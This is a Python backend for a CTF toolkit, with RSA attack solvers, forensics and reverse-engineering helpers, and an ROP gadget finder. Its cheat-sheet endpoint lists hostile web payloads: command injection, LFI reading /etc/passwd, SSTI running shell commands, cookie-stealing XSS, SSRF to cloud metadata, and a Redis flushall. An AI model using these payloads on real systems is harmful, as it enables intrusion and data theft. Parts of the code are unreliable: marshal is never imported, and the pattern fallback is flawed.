from rsa_solver import parse_rsa_input, solve_rsa_auto, decode_message, solve_wiener, solve_common_modulus
#!/usr/bin/env python3
import os
import sys
import json
import math
import subprocess
import tempfile
import hashlib
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# Pwntools / scapy / crypto imports
try:
    from pwn import cyclic, cyclic_find
except Exception:
    cyclic = None
    cyclic_find = None

PORT = 8020
FLAG_REGEX = re.compile(r'(?:GETSFLAG|picoCTF|pico|FLAG|flag|CTF|HTB|THM)\{[^{}\n]{1,80}\}')

def calc_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    entropy = 0.0
    length = len(data)
    for f in freq:
        if f > 0:
            p = f / length
            entropy -= p * math.log2(p)
    return round(entropy, 4)

def hunt_flags(text_or_bytes) -> list:
    if isinstance(text_or_bytes, bytes):
        text = text_or_bytes.decode('utf-8', errors='ignore')
    else:
        text = str(text_or_bytes)
    return list(set(FLAG_REGEX.findall(text)))

class CTFRequestHandler(BaseHTTPRequestHandler):
    def _send_json(self, data, status=200):
        body = json.dumps(data).encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-CSRF')
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-CSRF')
        self.end_headers()

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ['/api/web/cheatsheets', '/ctf-tools/api/web/cheatsheets']:
            cheats = {
                "Command Injection": ["; id", "| id", "$(id)", "`id`", "%0aid", "|| id", "& whoami", "| cat /flag*", "; cat /flag.txt", "`cat flag*`"],
                "LFI": ["../../../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....\\....\\windows\\win.ini", "php://filter/read=convert.base64-encode/resource=flag.php"],
                "SQLi": ["' OR '1'='1", "' OR 1=1-- -", "' UNION SELECT NULL,version()-- -", "admin'-- -", "') OR ('1'='1", "1' AND SLEEP(5)-- -", "-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"],
                "SSTI": ["{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}", "*{7*7}"],
                "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(document.cookie)</script>"],
                "SSRF": ["http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/", "http://0.0.0.0:80/", "http://[::]:80/", "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"],
                "XXE": ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"]
            }
            self._send_json({"data": cheats, "success": True})
            return
        self._send_json({"error": "Not Found"}, 404)

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        content_type = self.headers.get('Content-Type', '')
        content_len = int(self.headers.get('Content-Length', 0))

        # RSA Auto & Specialized Solvers
        if path.endswith('/api/crypto/solve/rsa_auto'):
            body = self.rfile.read(content_len).decode('utf-8')
            params_req = json.loads(body) if body else {}
            raw_text = params_req.get('text', '')
            parsed_params = parse_rsa_input(raw_text)
            res = solve_rsa_auto(parsed_params)
            self._send_json(res)
            return

        if path.endswith('/api/crypto/solve/rsa'):
            body = self.rfile.read(content_len).decode('utf-8')
            req_data = json.loads(body) if body else {}
            # Normalize integers
            clean_params = {}
            for k in ['n', 'e', 'c', 'p', 'q', 'phi', 'd']:
                v = req_data.get(k)
                if v:
                    try:
                        clean_params[k] = int(str(v).strip(), 16 if str(v).strip().startswith(('0x', '0X')) else 10)
                    except ValueError:
                        pass
            # Check multi-prime
            primes_str = req_data.get('primes', '')
            if primes_str:
                try:
                    primes = [int(x.strip()) for x in primes_str.split(',') if x.strip()]
                    if len(primes) >= 2 and 'c' in clean_params:
                        import gmpy2
                        n = 1
                        phi = 1
                        for pr in primes:
                            n *= pr
                            phi *= (pr - 1)
                        e = clean_params.get('e', 65537)
                        d = int(gmpy2.invert(e, phi))
                        m = pow(clean_params['c'], d, n)
                        dec = decode_message(m)
                        self._send_json({
                            "success": True,
                            "data": {
                                "method": f"Multi-Prime RSA ({len(primes)} primes)",
                                "plaintext": dec["text"],
                                "flag": dec["flag"],
                                "decimal": str(m),
                                "hex": dec["hex"],
                                "d": str(d),
                                "phi": str(phi)
                            }
                        })
                        return
                except Exception as err:
                    pass

            res = solve_rsa_auto(clean_params)
            self._send_json(res)
            return

        if path.endswith('/api/crypto/solve/rsa_wiener'):
            body = self.rfile.read(content_len).decode('utf-8')
            req_data = json.loads(body) if body else {}
            try:
                n = int(str(req_data.get('n', '')).strip(), 16 if str(req_data.get('n', '')).strip().startswith(('0x', '0X')) else 10)
                e = int(str(req_data.get('e', '')).strip(), 16 if str(req_data.get('e', '')).strip().startswith(('0x', '0X')) else 10)
                c_val = req_data.get('c')
                c = int(str(c_val).strip(), 16 if str(c_val).strip().startswith(('0x', '0X')) else 10) if c_val else None
                wiener_res = solve_wiener(n, e)
                if wiener_res:
                    d, p, q = wiener_res
                    data_out = {"method": "Wiener Attack", "d": str(d), "p": str(p), "q": str(q)}
                    if c:
                        m = pow(c, d, n)
                        dec = decode_message(m)
                        data_out.update({"plaintext": dec["text"], "flag": dec["flag"], "hex": dec["hex"], "decimal": str(m)})
                    self._send_json({"success": True, "data": data_out})
                    return
                else:
                    self._send_json({"success": False, "message": "Wiener attack gagal: d tidak cukup kecil (< 1/3 n^0.25)."})
                    return
            except Exception as err:
                self._send_json({"success": False, "message": f"Error: {err}"})
                return

        if path.endswith('/api/crypto/solve/rsa_common'):
            body = self.rfile.read(content_len).decode('utf-8')
            req_data = json.loads(body) if body else {}
            try:
                n = int(str(req_data.get('n', '')).strip())
                e1 = int(str(req_data.get('e1', '')).strip())
                c1 = int(str(req_data.get('c1', '')).strip())
                e2 = int(str(req_data.get('e2', '')).strip())
                c2 = int(str(req_data.get('c2', '')).strip())
                m = solve_common_modulus(n, e1, c1, e2, c2)
                if m is not None:
                    dec = decode_message(m)
                    self._send_json({
                        "success": True,
                        "data": {
                            "method": "Common Modulus Attack",
                            "plaintext": dec["text"],
                            "flag": dec["flag"],
                            "hex": dec["hex"],
                            "decimal": str(m)
                        }
                    })
                    return
                else:
                    self._send_json({"success": False, "message": "Common Modulus gagal: gcd(e1, e2) != 1."})
                    return
            except Exception as err:
                self._send_json({"success": False, "message": f"Error: {err}"})
                return

        if path.endswith('/api/crypto/solve/rsa_hastad'):
            body = self.rfile.read(content_len).decode('utf-8')
            req_data = json.loads(body) if body else {}
            try:
                import gmpy2
                pairs = req_data.get('pairs', [])
                if len(pairs) >= 3:
                    c1, n1 = int(pairs[0][0]), int(pairs[0][1])
                    c2, n2 = int(pairs[1][0]), int(pairs[1][1])
                    c3, n3 = int(pairs[2][0]), int(pairs[2][1])
                    N = n1 * n2 * n3
                    N1 = n2 * n3
                    N2 = n1 * n3
                    N3 = n1 * n2
                    u1 = int(gmpy2.invert(N1, n1))
                    u2 = int(gmpy2.invert(N2, n2))
                    u3 = int(gmpy2.invert(N3, n3))
                    C = (c1 * N1 * u1 + c2 * N2 * u2 + c3 * N3 * u3) % N
                    m, exact = gmpy2.iroot(C, 3)
                    if exact:
                        dec = decode_message(int(m))
                        self._send_json({
                            "success": True,
                            "data": {
                                "method": "Hastad Broadcast Attack (e=3)",
                                "plaintext": dec["text"],
                                "flag": dec["flag"],
                                "hex": dec["hex"],
                                "decimal": str(int(m))
                            }
                        })
                        return
                    else:
                        self._send_json({"success": False, "message": "Hastad broadcast gagal: C mod N bukan pangkat 3 sempurna."})
                        return
                else:
                    self._send_json({"success": False, "message": "Hastad memerlukan minimal 3 pasangan (c, n)."})
                    return
            except Exception as err:
                self._send_json({"success": False, "message": f"Error: {err}"})
                return
        # 1. Pwn Cyclic Generation
        if path.endswith('/api/pwn/cyclic'):
            body = self.rfile.read(content_len).decode('utf-8')
            params = json.loads(body) if body else {}
            length = int(params.get('length', 200))
            if cyclic:
                pat = cyclic(length).decode('latin1')
            else:
                # Custom de Bruijn sequence generator
                chars = "abcdefghijklmnopqrstuvwxyz"
                pat = "".join(chars[i // 4 % 26] if i % 4 == 0 else chars[(i // 4 + i % 4) % 26] for i in range(length))
            self._send_json({"success": True, "data": {"pattern": pat}})
            return

        # 2. Pwn Cyclic Find Offset
        if path.endswith('/api/pwn/cyclic_find'):
            body = self.rfile.read(content_len).decode('utf-8')
            params = json.loads(body) if body else {}
            val = str(params.get('value', ''))
            offset = -1
            if val.startswith('0x'):
                try:
                    val_bytes = bytes.fromhex(val[2:])
                    # little-endian reverse
                    val = val_bytes[::-1].decode('latin1', errors='ignore')
                except Exception:
                    pass
            if cyclic_find and len(val) >= 4:
                try:
                    offset = cyclic_find(val.encode('latin1'))
                except Exception:
                    offset = -1
            if offset == -1:
                # fallback string search in standard cyclic pattern
                sample = cyclic(10000).decode('latin1') if cyclic else ""
                offset = sample.find(val)
            self._send_json({"success": True, "data": {"offset": offset}})
            return

        # Handle Multipart Form Data for Forensics, Reverse & ELF Checksec
        if 'multipart/form-data' in content_type:
            boundary = content_type.split('boundary=')[1].strip().encode('utf-8')
            raw_body = self.rfile.read(content_len)

            # Extract parts
            parts = raw_body.split(b'--' + boundary)
            file_data = None
            filename = 'upload.bin'
            mode = 'checksec'

            for p in parts:
                if b'filename=' in p:
                    head, body_p = p.split(b'\r\n\r\n', 1)
                    body_p = body_p.rstrip(b'\r\n')
                    m_fn = re.search(rb'filename="([^"]+)"', head)
                    if m_fn:
                        filename = m_fn.group(1).decode('utf-8', errors='ignore')
                    file_data = body_p
                elif b'name="mode"' in p:
                    head, body_p = p.split(b'\r\n\r\n', 1)
                    mode = body_p.rstrip(b'\r\n').decode('utf-8', errors='ignore')

            if not file_data:
                self._send_json({"success": False, "message": "Tidak ada berkas yang diunggah"}, 400)
                return

            # Write to temp file for CLI processing
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp.write(file_data)
                tmp_path = tmp.name

            try:
                # 3. Forensics Auto Analysis
                if path.endswith('/api/forensics'):
                    size = len(file_data)
                    entropy = calc_entropy(file_data)
                    md5 = hashlib.md5(file_data).hexdigest()
                    sha1 = hashlib.sha1(file_data).hexdigest()
                    sha256 = hashlib.sha256(file_data).hexdigest()

                    sections = []
                    # File type
                    res_file = subprocess.run(['file', '-b', tmp_path], capture_output=True, text=True, timeout=5)
                    sections.append({"title": "file command", "ok": True, "text": res_file.stdout.strip()})

                    # Exiftool
                    res_exif = subprocess.run(['exiftool', tmp_path], capture_output=True, text=True, timeout=8)
                    sections.append({"title": "exiftool metadata", "ok": True, "text": res_exif.stdout.strip()[:3000]})

                    # Binwalk
                    res_bw = subprocess.run(['binwalk', tmp_path], capture_output=True, text=True, timeout=12)
                    sections.append({"title": "binwalk carve preview", "ok": True, "text": res_bw.stdout.strip()[:3000]})

                    # Strings with flags
                    res_str = subprocess.run(['strings', '-n', '6', tmp_path], capture_output=True, text=True, timeout=8)
                    flags = hunt_flags(res_str.stdout)
                    str_preview = res_str.stdout[:3500]
                    if flags:
                        str_preview = "[+] FLAGS DETECTED:\n" + "\n".join(flags) + "\n\n" + str_preview
                    sections.append({"title": "strings inspection", "ok": True, "text": str_preview})

                    self._send_json({
                        "success": True,
                        "data": {
                            "filename": filename,
                            "size": size,
                            "entropy": entropy,
                            "md5": md5,
                            "sha1": sha1,
                            "sha256": sha256,
                            "sections": sections
                        }
                    })
                    return

                # 4. PCAP Forensics Analysis
                if path.endswith('/api/forensics/pcap'):
                    sections = []
                    # Tshark summary
                    res_cap = subprocess.run(['tshark', '-r', tmp_path, '-c', '100', '-q', '-z', 'io,phs'], capture_output=True, text=True, timeout=15)
                    sections.append({"title": "Protocol Hierarchy", "ok": True, "text": res_cap.stdout.strip()})

                    # HTTP requests
                    res_http = subprocess.run(['tshark', '-r', tmp_path, '-Y', 'http.request', '-T', 'fields', '-e', 'ip.src', '-e', 'http.request.method', '-e', 'http.request.uri', '-e', 'http.host'], capture_output=True, text=True, timeout=15)
                    sections.append({"title": "HTTP Traffic Requests", "ok": True, "text": res_http.stdout.strip()[:3000] if res_http.stdout else "(Tidak ada HTTP request)"})

                    # DNS queries
                    res_dns = subprocess.run(['tshark', '-r', tmp_path, '-Y', 'dns.flags.response == 0', '-T', 'fields', '-e', 'dns.qry.name'], capture_output=True, text=True, timeout=15)
                    dns_lines = list(set(res_dns.stdout.splitlines()))[:50]
                    sections.append({"title": "DNS Query Resolution (Data Exfiltration Hunt)", "ok": True, "text": "\n".join(dns_lines) if dns_lines else "(Tidak ada query DNS)"})

                    # Flag hunt
                    flags = hunt_flags(file_data)
                    if flags:
                        sections.insert(0, {"title": "🚩 FLAGS FOUND IN PCAP", "ok": True, "text": "\n".join(flags)})

                    self._send_json({
                        "success": True,
                        "data": {
                            "filename": filename,
                            "size": len(file_data),
                            "entropy": calc_entropy(file_data),
                            "md5": hashlib.md5(file_data).hexdigest(),
                            "sha1": hashlib.sha1(file_data).hexdigest(),
                            "sha256": hashlib.sha256(file_data).hexdigest(),
                            "sections": sections
                        }
                    })
                    return

                # 5. Office / PDF Forensics Analysis
                if path.endswith('/api/forensics/office'):
                    sections = []
                    # Run olefile / strings / exiftool
                    res_exif = subprocess.run(['exiftool', tmp_path], capture_output=True, text=True, timeout=8)
                    sections.append({"title": "Document Metadata", "ok": True, "text": res_exif.stdout.strip()})

                    # Check for embedded objects or macros via strings
                    res_str = subprocess.run(['strings', tmp_path], capture_output=True, text=True, timeout=8)
                    flags = hunt_flags(res_str.stdout)
                    if flags:
                        sections.insert(0, {"title": "🚩 FLAGS FOUND IN DOCUMENT", "ok": True, "text": "\n".join(flags)})

                    self._send_json({
                        "success": True,
                        "data": {
                            "filename": filename,
                            "size": len(file_data),
                            "entropy": calc_entropy(file_data),
                            "md5": hashlib.md5(file_data).hexdigest(),
                            "sha1": hashlib.sha1(file_data).hexdigest(),
                            "sha256": hashlib.sha256(file_data).hexdigest(),
                            "sections": sections
                        }
                    })
                    return

                # 6. Reverse Engineering Analysis
                if path.endswith('/api/reverse'):
                    kind = "Generic Binary"
                    sections = []

                    # Detect type
                    res_file = subprocess.run(['file', '-b', tmp_path], capture_output=True, text=True, timeout=5)
                    file_desc = res_file.stdout.strip()

                    if 'ELF' in file_desc:
                        kind = "Linux ELF Executable"
                        # readelf header
                        res_elf = subprocess.run(['readelf', '-h', tmp_path], capture_output=True, text=True, timeout=5)
                        sections.append({"title": "ELF Header", "ok": True, "text": res_elf.stdout.strip()})
                        # Disassemble main or entry point
                        res_obj = subprocess.run(['objdump', '-d', '-M', 'intel', '--no-show-raw-insn', tmp_path], capture_output=True, text=True, timeout=10)
                        obj_out = res_obj.stdout[:5000] if res_obj.stdout else "(Objdump disassembly empty)"
                        sections.append({"title": "Disassembly (x86_64 Intel)", "ok": True, "text": obj_out})
                    elif 'python' in file_desc.lower() or filename.endswith('.pyc'):
                        kind = "Python Bytecode (.pyc)"
                        # Disassemble python bytecode using dis
                        try:
                            import dis
                            with open(tmp_path, 'rb') as pf:
                                pf.seek(16) # Skip PEP 552 header
                                code_obj = marshal.load(pf)
                                import io
                                str_io = io.StringIO()
                                dis.dis(code_obj, file=str_io)
                                sections.append({"title": "Python Bytecode Disassembly", "ok": True, "text": str_io.getvalue()[:4000]})
                        except Exception as e:
                            sections.append({"title": "Python Bytecode Inspection", "ok": False, "text": f"Error parsing code object: {e}"})
                    else:
                        kind = file_desc
                        res_obj = subprocess.run(['strings', '-n', '5', tmp_path], capture_output=True, text=True, timeout=8)
                        sections.append({"title": "Identified Strings", "ok": True, "text": res_obj.stdout[:3500]})

                    # Flag search
                    flags = hunt_flags(file_data)
                    if flags:
                        sections.insert(0, {"title": "🚩 FLAGS DETECTED IN BINARY", "ok": True, "text": "\n".join(flags)})

                    self._send_json({
                        "success": True,
                        "data": {
                            "kind": kind,
                            "filename": filename,
                            "sections": sections
                        }
                    })
                    return

                # 7. ELF Checksec & ROP Gadgets
                if path.endswith('/api/pwn/elf'):
                    if mode == 'rop':
                        # Generate gadgets via ROPgadget or objdump grep
                        res_obj = subprocess.run(['objdump', '-d', '-M', 'intel', tmp_path], capture_output=True, text=True, timeout=12)
                        gadgets = []
                        for line in res_obj.stdout.splitlines():
                            if any(op in line for op in ['ret', 'pop rdi', 'pop rsi', 'pop rdx', 'pop rax', 'syscall']):
                                gadgets.append(line.strip())
                        rop_text = "\n".join(gadgets[:100]) if gadgets else "(Gadgets tidak ditemukan)"
                        self._send_json({"success": True, "data": {"mode": "rop", "text": rop_text}})
                        return
                    else:
                        # Checksec execution
                        res_cs = subprocess.run(['checksec', '--file=' + tmp_path], capture_output=True, text=True, timeout=8)
                        cs_out = res_cs.stdout + res_cs.stderr
                        parsed_cs = {
                            "RELRO": "Full RELRO" if "Full RELRO" in cs_out else ("Partial RELRO" if "Partial RELRO" in cs_out else "No RELRO"),
                            "Stack Canary": True if "Canary found" in cs_out else False,
                            "NX": True if "NX enabled" in cs_out else False,
                            "PIE": True if "PIE enabled" in cs_out else False,
                            "Fortify": True if "Fortified" in cs_out else False
                        }
                        self._send_json({"success": True, "data": {"mode": "checksec", "checksec": parsed_cs}})
                        return

            finally:
                if os.path.exists(tmp_path):
                    os.remove(tmp_path)

        self._send_json({"error": "Unknown Endpoint"}, 404)

if __name__ == '__main__':
    server = HTTPServer(('127.0.0.1', PORT), CTFRequestHandler)
    print(f"CTF Tools Backend running on port {PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()
